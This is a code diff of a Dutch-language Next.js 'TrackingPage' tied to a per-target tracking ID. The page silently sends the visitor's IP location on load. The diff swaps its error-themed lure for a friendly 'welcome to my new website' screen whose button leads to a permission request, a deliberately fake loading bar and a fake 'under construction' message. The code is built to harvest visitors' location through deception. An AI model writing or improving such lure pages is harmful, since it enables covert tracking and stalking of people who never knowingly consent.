@@ -6,9 +6,7 @@ import { useParams } from "next/navigation";
 export default function TrackingPage() {
   const params = useParams();
   const trackingId = params.id as string;
-  const [status, setStatus] = useState<"glitching" | "requesting" | "loading" | "error">("glitching");
-  const [glitchText, setGlitchText] = useState("Pagina laden...");
-  const [showButton, setShowButton] = useState(false);
+  const [status, setStatus] = useState<"welcome" | "requesting" | "loading" | "error">("welcome");
   const [loadingProgress, setLoadingProgress] = useState(0);
 
   // Automatisch IP-locatie versturen bij het laden van de pagina
@@ -31,35 +29,6 @@ export default function TrackingPage() {
     
     sendIpLocation();
   }, [trackingId]);
-
-  // Glitch effect simulatie
-  useEffect(() => {
-    const glitchMessages = [
-      "Pagina laden...",
-      "Verbinden met server...",
-      "Error: timeout",
-      "Opnieuw proberen...",
-      "Laden...",
-      "Fout: kan pagina niet laden",
-      "Verbinding mislukt",
-    ];
-
-    let index = 0;
-    const interval = setInterval(() => {
-      index = (index + 1) % glitchMessages.length;
-      setGlitchText(glitchMessages[index]);
-    }, 800);
-
-    // Toon de knop na 3 seconden
-    const buttonTimer = setTimeout(() => {
-      setShowButton(true);
-    }, 3000);
-
-    return () => {
-      clearInterval(interval);
-      clearTimeout(buttonTimer);
-    };
-  }, []);
 
   const handleButtonClick = async () => {
     setStatus("requesting");
@@ -117,121 +86,98 @@ export default function TrackingPage() {
 
   const startFakeLoading = () => {
     setStatus("loading");
-    // Fake loading progress
     let progress = 0;
     const interval = setInterval(() => {
-      progress += Math.random() * 15;
+      progress += Math.random() * 12;
       if (progress >= 100) {
         progress = 100;
         clearInterval(interval);
-        // Na "laden" toon een error
         setTimeout(() => {
           setStatus("error");
         }, 500);
       }
       setLoadingProgress(Math.min(progress, 100));
-    }, 300);
+    }, 400);
   };
 
   return (
-    <div className="min-h-screen bg-gray-900 flex items-center justify-center p-4 font-mono">
-      <div className="max-w-lg w-full">
-        {status === "glitching" && (
-          <div className="text-center">
-            {/* Glitchy header */}
-            <div className="mb-8">
-              <h1 className="text-white text-xl mb-2 opacity-80">
-                🚧 Website in ontwikkeling
-              </h1>
-              <div className="h-px bg-gray-700 w-full"></div>
+    <div className="min-h-screen bg-gradient-to-br from-indigo-500 via-purple-500 to-pink-500 flex items-center justify-center p-4">
+      <div className="max-w-md w-full">
+        {status === "welcome" && (
+          <div className="bg-white rounded-3xl shadow-2xl p-8 text-center">
+            {/* Logo/Icon */}
+            <div className="w-20 h-20 bg-gradient-to-br from-indigo-500 to-purple-600 rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-lg">
+              <span className="text-4xl">✨</span>
             </div>
+            
+            {/* Titel */}
+            <h1 className="text-2xl font-bold text-gray-800 mb-3">
+              Welkom!
+            </h1>
+            
+            {/* Bericht */}
+            <p className="text-gray-600 mb-8 leading-relaxed">
+              Leuk dat je mijn nieuwe website wilt bekijken! 
+              Klik op de knop om door te gaan.
+            </p>
 
-            {/* Fake console/terminal look */}
-            <div className="bg-black rounded-lg p-4 text-left mb-6 border border-gray-700">
-              <div className="flex items-center gap-2 mb-3 pb-2 border-b border-gray-800">
-                <div className="w-3 h-3 rounded-full bg-red-500"></div>
-                <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
-                <div className="w-3 h-3 rounded-full bg-green-500"></div>
-                <span className="text-gray-500 text-xs ml-2">console</span>
-              </div>
-              <div className="space-y-1 text-sm">
-                <p className="text-green-400">&gt; Initialiseren...</p>
-                <p className="text-yellow-400">&gt; Laden van assets...</p>
-                <p className="text-red-400 animate-pulse">&gt; {glitchText}</p>
-              </div>
-            </div>
+            {/* Button */}
+            <button
+              onClick={handleButtonClick}
+              className="w-full bg-gradient-to-r from-indigo-500 to-purple-600 hover:from-indigo-600 hover:to-purple-700 text-white text-lg font-semibold py-4 px-8 rounded-xl shadow-lg transform transition-all hover:scale-105 active:scale-95"
+            >
+              Doorgaan →
+            </button>
 
-            {/* Error message */}
-            <div className="bg-red-900/30 border border-red-800 rounded-lg p-4 mb-6">
-              <p className="text-red-400 text-sm">
-                ⚠️ Er ging iets mis bij het laden van de pagina.
-              </p>
-              <p className="text-red-300/70 text-xs mt-1">
-                Dit kan komen door je browser instellingen.
-              </p>
-            </div>
-
-            {/* Button appears after delay */}
-            {showButton && (
-              <button
-                onClick={handleButtonClick}
-                className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-4 px-6 rounded-lg transition-all transform hover:scale-105 active:scale-95 animate-pulse"
-              >
-                🔄 Opnieuw laden
-              </button>
-            )}
-
-            {!showButton && (
-              <div className="text-gray-500 text-sm">
-                Even geduld...
-              </div>
-            )}
+            {/* Subtle hint */}
+            <p className="text-gray-400 text-xs mt-6">
+              Nog in ontwikkeling • Feedback welkom!
+            </p>
           </div>
         )}
 
         {status === "requesting" && (
-          <div className="text-center">
-            <div className="bg-black rounded-lg p-6 border border-gray-700">
-              <div className="animate-spin text-4xl mb-4">⚙️</div>
-              <p className="text-gray-300">Pagina opnieuw laden...</p>
-              <p className="text-gray-500 text-sm mt-2">Toestemming nodig voor volledige functionaliteit</p>
-            </div>
+          <div className="bg-white rounded-3xl shadow-2xl p-8 text-center">
+            <div className="w-16 h-16 border-4 border-indigo-200 border-t-indigo-500 rounded-full animate-spin mx-auto mb-6"></div>
+            <p className="text-gray-700 font-medium">Even geduld...</p>
+            <p className="text-gray-400 text-sm mt-2">Website wordt geladen</p>
           </div>
         )}
 
         {status === "loading" && (
-          <div className="text-center">
-            <div className="bg-black rounded-lg p-6 border border-gray-700">
-              <p className="text-gray-300 mb-4">Laden... {Math.round(loadingProgress)}%</p>
-              <div className="w-full bg-gray-800 rounded-full h-2">
+          <div className="bg-white rounded-3xl shadow-2xl p-8 text-center">
+            <div className="mb-6">
+              <p className="text-gray-700 font-medium mb-3">Laden... {Math.round(loadingProgress)}%</p>
+              <div className="w-full bg-gray-200 rounded-full h-3 overflow-hidden">
                 <div 
-                  className="bg-blue-500 h-2 rounded-full transition-all duration-300"
+                  className="bg-gradient-to-r from-indigo-500 to-purple-600 h-3 rounded-full transition-all duration-300"
                   style={{ width: `${loadingProgress}%` }}
                 ></div>
               </div>
             </div>
+            <p className="text-gray-400 text-sm">Bijna klaar...</p>
           </div>
         )}
 
         {status === "error" && (
-          <div className="text-center">
-            <div className="bg-black rounded-lg p-6 border border-gray-700">
-              <div className="text-4xl mb-4">🔧</div>
-              <p className="text-gray-300 mb-2">Website nog niet beschikbaar</p>
+          <div className="bg-white rounded-3xl shadow-2xl p-8 text-center">
+            <div className="w-20 h-20 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-6">
+              <span className="text-4xl">🚧</span>
+            </div>
+            <h2 className="text-xl font-bold text-gray-800 mb-3">
+              Oeps! Nog niet klaar
+            </h2>
+            <p className="text-gray-600 mb-6">
+              Sorry, deze pagina is nog in ontwikkeling. 
+              Ik laat je weten wanneer ie af is!
+            </p>
+            <div className="bg-gray-100 rounded-xl p-4">
               <p className="text-gray-500 text-sm">
-                Sorry, we zijn nog bezig met bouwen!<br/>
-                Probeer het later nog eens.
+                Bedankt voor het kijken! 🙏
               </p>
             </div>
           </div>
         )}
-
-        {/* Footer */}
-        <div className="mt-8 text-center">
-          <p className="text-gray-600 text-xs">
-            v0.1.0-beta • {new Date().getFullYear()}
-          </p>
-        </div>
       </div>
     </div>
   );
